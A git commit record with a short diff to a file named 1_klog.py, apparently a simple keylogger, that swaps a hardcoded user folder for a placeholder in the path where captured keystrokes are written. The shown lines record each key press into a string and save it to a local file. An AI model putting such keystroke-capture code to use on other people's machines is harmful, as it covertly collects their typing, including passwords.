a0d6698491f12eb5389de1c5714f670534a96ee0
Abhiram Kanna Seelamanthula <88733940+aksisonline@users.noreply.github.com>
2024-02-11 04:06:11 +0530

    Update 1_klog.py

--- 1_klog.py
+++ 1_klog.py
@@ -5,7 +5,7 @@ def on_press(key):
     global typed_chars
     typed_chars += str(key) + ' '
     if typed_chars[-3] == ']':
-        with open('C:/Users/abhir/output', 'a') as f:
+        with open('C:/Users/<type_your_pc_name>/output', 'a') as f:
             f.write(typed_chars)
         exit()
 
